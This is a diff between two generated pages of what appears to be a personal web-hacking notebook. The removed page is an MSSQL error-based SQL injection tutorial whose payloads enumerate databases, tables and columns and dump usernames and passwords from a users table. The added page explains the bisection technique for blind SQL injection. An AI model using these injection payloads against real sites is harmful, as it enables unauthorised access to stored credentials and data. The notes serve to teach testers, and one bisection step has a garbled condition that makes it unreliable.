@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>MSSQL Server · GitBook</title>
+        <title>Bisection Technique · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -57,7 +57,7 @@
     <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="mysql-server.html" />
+    <link rel="next" href="time-based-blind-sqli.html" />
     
     
     <link rel="prev" href="./" />
@@ -162,9 +162,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.3" data-path="./">
+        <li class="chapter " data-level="2.2.3" data-path="../error-based-sqli/">
             
-                <a href="./">
+                <a href="../error-based-sqli/">
             
                     
                     Error-based SQLi
@@ -176,9 +176,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter active" data-level="2.2.3.1" data-path="mssql-server.html">
+        <li class="chapter " data-level="2.2.3.1" data-path="../error-based-sqli/mssql-server.html">
             
-                <a href="mssql-server.html">
+                <a href="../error-based-sqli/mssql-server.html">
             
                     
                     MSSQL Server
@@ -189,9 +189,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.3.2" data-path="mysql-server.html">
+        <li class="chapter " data-level="2.2.3.2" data-path="../error-based-sqli/mysql-server.html">
             
-                <a href="mysql-server.html">
+                <a href="../error-based-sqli/mysql-server.html">
             
                     
                     MySQL Server
@@ -202,9 +202,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.3.3" data-path="postgresql-server.html">
+        <li class="chapter " data-level="2.2.3.3" data-path="../error-based-sqli/postgresql-server.html">
             
-                <a href="postgresql-server.html">
+                <a href="../error-based-sqli/postgresql-server.html">
             
                     
                     postgreSQL Server
@@ -220,9 +220,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.4" data-path="../blind-sqli/">
+        <li class="chapter " data-level="2.2.4" data-path="./">
             
-                <a href="../blind-sqli/">
+                <a href="./">
             
                     
                     Blind SQLi
@@ -234,9 +234,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="2.2.4.1" data-path="../blind-sqli/bisection-technique.html">
+        <li class="chapter active" data-level="2.2.4.1" data-path="bisection-technique.html">
             
-                <a href="../blind-sqli/bisection-technique.html">
+                <a href="bisection-technique.html">
             
                     
                     Bisection Technique
@@ -247,9 +247,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.4.2" data-path="../blind-sqli/time-based-blind-sqli.html">
+        <li class="chapter " data-level="2.2.4.2" data-path="time-based-blind-sqli.html">
             
-                <a href="../blind-sqli/time-based-blind-sqli.html">
+                <a href="time-based-blind-sqli.html">
             
                     
                     Time-Based Blind SQLi
@@ -509,7 +509,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href="../../.." >MSSQL Server</a>
+        <a href="../../.." >Bisection Technique</a>
     </h1>
 </div>
 
@@ -524,86 +524,36 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="mssql-server">MSSQL Server</h1>
-<p>In MSSQL, the name of the database objects are revealed within errors. the user sa is the super admin and has access to the master database. The master database contains schemas of user-defined dbs.</p>
-<p>First thing we can do to start exploting it is to discover the database version, we can trigger a type conversion error for that.</p>
-<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(&lt;FIELDNAME&gt; as varchar(4096)) from &lt;TABLENAME&gt; WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;)); --
-</code></pre>
+                                <h1 id="bisection-technique">Bisection Technique</h1>
+<p>To speed up the SQLi, we can use a technique named Bisection, which reduces the number of queries by narrowing down the number of characters in the charset that you need to query. This means that you need to be able to understand the nature of the character you are trying to guess:</p>
 <ul>
-<li><code>99999</code> is a bogus value.</li>
-<li><code>or 1 in</code> is the part of the query that will trigger the error, we are trying to find 1, an integer, within a varchar column.</li>
-<li><code>CAST(&lt;FIELDNAME&gt; as varchar(4096))</code> is where we insert the column that we want to dump (either user-based or special database column). </li>
-<li><code>&lt;FIELDNAME&gt;</code> can also be a SQL function like <code>user_name()</code> or a variable like <code>@@version</code></li>
-<li><code>WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;)</code> this part is used to dump the database and can be ommited or ajusted.</li>
+<li>[A-Z]</li>
+<li>[a-z]</li>
+<li>[0-9]</li>
 </ul>
-<p>To retrieve the SQL version:</p>
-<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096))) --
+<p>For that, we will be using the following functions:</p>
+<p>ASCII() returns the ASCII code of a character. UPPER() function transforms a character into uppercase. LOWER() function transforms a character into lowercase.</p>
+<p>The first test is too see if the conversion to uppercase of the current character will yield a FALSE or TRUE condition:</p>
+<pre><code class="lang-text">ASCII(UPPER(SUBSTRING((), , 1)))=
 </code></pre>
-<pre><code class="lang-text">[Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value &apos;Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (X64) Jun 28 2012 08:36:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor) &apos; to data type int.
+<p>Then, we test if the conversion to lowercase of the current character will yield a FALSE or TRUE condition:</p>
+<pre><code class="lang-text">ASCII(LOWER(SUBSTRING((), , 1)))=
 </code></pre>
-<p>So, with all this information, how can I dump the entire database?</p>
-<p>First of all, we need to discover some stuff:</p>
+<p>Now we need to evaluate the results:</p>
 <ul>
-<li>Current database username:</li>
+<li>If the first query returns TRUE and the second is FALSE, the character is uppercase. So we will iterate through [A-Z] </li>
+<li>If the second query returns FALSE and the second is TRUE, the character is lowercase. So we will iterate through [a-z] </li>
+<li>If both queries are TRUE, the character is either a number or a symbol. So we will iterate through [0-9] and symbols only.</li>
 </ul>
-<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096))) --
+<p>Now, for example, you discovered that the character is lowercase. After that, you need to detect the first character.  One way to decrease your scope by asking the server if the character ASCII value is higher or lower than an arbitrary ASCII value:</p>
+<pre><code class="lang-text">&apos; OR ASCII(SUBSTRING(user(),1,1)) &lt;=109
 </code></pre>
-<p>*user_name() is a MSSQL function which returns the current user.</p>
+<p>For example, right now, we&apos;re asking if the ASCII value of the first character of the username is lower than 109. Lowercase ASCII values goes from 97-122. In this case, 109 would be M, which is in the middle of the alphabet. </p>
 <ul>
-<li>Current databases and all other databases the user can read</li>
+<li>If the application returns FALSE, you now the first character ASCII value is higher than 109, that means it can only be N-Z. </li>
+<li>If it returns TRUE, you now the first character ASCII value is lower than 109, that means it can only be A-M.</li>
 </ul>
-<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(db_name(0) as varchar(4096))) --
-99999 or 1 in (SELECT TOP 1 CAST(db_name(1) as varchar(4096))) --
-99999 or 1 in (SELECT TOP 1 CAST(db_name(2) as varchar(4096))) --
-</code></pre>
-<p>*db_name() functoin accesses the master..sysdatabases table, which stores all databases installed. We can only see dbs that the user has rights to.</p>
-<ul>
-<li>The tables into a given database</li>
-</ul>
-<p>To enumerate all tables in a database, we can use the following payload:</p>
-<pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST(name as varchar (4096)) FROM &lt;database name&gt;..sysobjects WHERE xtype=&apos;U&apos; and name NOT IN (&lt;known table list&gt;)); --
-</code></pre>
-<ul>
-<li><code>xtype means=&apos;U&apos;</code> means we only want user-defined tables</li>
-<li><code>name NOT IN (&apos;&lt;know table list&gt;&apos;)</code> name is a column of the sysobjects table. Everytime we find a new table we will append it to the NOT IN list. This is needed because the error display only the first table name.</li>
-<li>The columns of a given table</li>
-</ul>
-<p>After retrieving the tables, we can retrieve the columns using the following payload:</p>
-<pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST (&lt;db name&gt;..syscolumns.name as varchar (4096)) FROM &lt;db name&gt;..syscolumns,&lt;db name&gt;..sysobjects WHERE &lt;db name&gt;..syscolumns.id=&lt;db name&gt;..sysobjects.id AND &lt;dbname&gt;. .sysobjects.name=&lt;table name&gt; AND &lt;db name&gt;..syscolumns.name NOT IN (&lt;known column list&gt;)); --
-</code></pre>
-<ul>
-<li><code>&lt;db name&gt;</code> is the name of database we&apos;re working on</li>
-<li><code>&lt;table name&gt;</code> is the table which we&apos;re trying to find the columns</li>
-<li><code>&lt;known column list&gt;</code> list of columns we already discovered</li>
-</ul>
-<p>Finally, to dump the database, we can use the following query:</p>
-<pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST (&lt;column name&gt; as varchar (4096) ) FROM &lt;db name&gt;..&lt;table name&gt; WHERE &lt;column name&gt; NOT IN (&lt;retrieved data list&gt;)); -- -
-</code></pre>
-<h2 id="example">Example</h2>
-<p>Lets say we have an exploitable page.php?id=1 and identified the table users in the database cms</p>
-<p>This table contains:</p>
-<ul>
-<li>id - integer</li>
-<li>username - varchar</li>
-<li>password - varchar</li>
-</ul>
-<p>To retrieve the ID values, we can use the following payload:</p>
-<pre><code class="lang-text">9999 or 1 IN (SELECT TOP 1 CAST(id as varchar) %2bchar(64) FROM cms..users WHERE id NOT IN (&apos;&apos;)); -- -
-</code></pre>
-<p>We need to concatenate the id value with @ to make sure the selected value has the data type varchar, this makes the error possible:</p>
-<pre><code class="lang-text">[Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value &apos;1@&apos; to data type int.
-</code></pre>
-<p>Proceed to filter out <code>1</code> and query again:</p>
-<pre><code class="lang-text">9999 OR 1 IN (SELECT TOP 1 CAST(id as varchar) %2bchar (64) FROM cms..users WHERE id NOT IN (&apos;1&apos;)); -- -
-</code></pre>
-<p>So, the resulting error is something like</p>
-<pre><code class="lang-text">Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value &apos;2@&apos; to data type int.
-</code></pre>
-<p>After enumerating the ID, basically request the username or/and password:</p>
-<pre><code class="lang-text">9999 OR 1 IN (SELECT TOP 1 CAST(username as varchar) FROM cms..users WHERE id=1); -- -
-9999 OR 1 IN (SELECT TOP 1 CAST(password as varchar) FROM cms..users WHERE id=1); -- -
-9999 OR 1 IN (SELECT username%2bchar(64) %2bpassword FROM cms..users WHERE id=1); -- -
-</code></pre>
+<p>This can be repeated indefinitely until you discover the first char. Always halving the scope of ASCII characters.</p>
 
                                 
                                 </section>
@@ -631,12 +581,12 @@
 
             
                 
-                <a href="./" class="navigation navigation-prev " aria-label="Previous page: Error-based SQLi">
+                <a href="./" class="navigation navigation-prev " aria-label="Previous page: Blind SQLi">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="mysql-server.html" class="navigation navigation-next " aria-label="Next page: MySQL Server">
+                <a href="time-based-blind-sqli.html" class="navigation navigation-next " aria-label="Next page: Time-Based Blind SQLi">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -647,7 +597,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"MSSQL Server","level":"2.2.3.1","depth":3,"next":{"title":"MySQL Server","level":"2.2.3.2","depth":3,"path":"web-stuff/sqli/error-based-sqli/mysql-server.md","ref":"web-stuff/sqli/error-based-sqli/mysql-server.md","articles":[]},"previous":{"title":"Error-based SQLi","level":"2.2.3","depth":2,"path":"web-stuff/sqli/error-based-sqli/README.md","ref":"web-stuff/sqli/error-based-sqli/README.md","articles":[{"title":"MSSQL Server","level":"2.2.3.1","depth":3,"path":"web-stuff/sqli/error-based-sqli/mssql-server.md","ref":"web-stuff/sqli/error-based-sqli/mssql-server.md","articles":[]},{"title":"MySQL Server","level":"2.2.3.2","depth":3,"path":"web-stuff/sqli/error-based-sqli/mysql-server.md","ref":"web-stuff/sqli/error-based-sqli/mysql-server.md","articles":[]},{"title":"postgreSQL Server","level":"2.2.3.3","depth":3,"path":"web-stuff/sqli/error-based-sqli/postgresql-server.md","ref":"web-stuff/sqli/error-based-sqli/postgresql-server.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web-stuff/sqli/error-based-sqli/mssql-server.md","mtime":"2020-07-26T17:50:13.605Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-07-26T20:52:16.907Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Bisection Technique","level":"2.2.4.1","depth":3,"next":{"title":"Time-Based Blind SQLi","level":"2.2.4.2","depth":3,"path":"web-stuff/sqli/blind-sqli/time-based-blind-sqli.md","ref":"web-stuff/sqli/blind-sqli/time-based-blind-sqli.md","articles":[]},"previous":{"title":"Blind SQLi","level":"2.2.4","depth":2,"path":"web-stuff/sqli/blind-sqli/README.md","ref":"web-stuff/sqli/blind-sqli/README.md","articles":[{"title":"Bisection Technique","level":"2.2.4.1","depth":3,"path":"web-stuff/sqli/blind-sqli/bisection-technique.md","ref":"web-stuff/sqli/blind-sqli/bisection-technique.md","articles":[]},{"title":"Time-Based Blind SQLi","level":"2.2.4.2","depth":3,"path":"web-stuff/sqli/blind-sqli/time-based-blind-sqli.md","ref":"web-stuff/sqli/blind-sqli/time-based-blind-sqli.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web-stuff/sqli/blind-sqli/bisection-technique.md","mtime":"2020-07-26T17:50:13.605Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-07-26T20:52:16.907Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
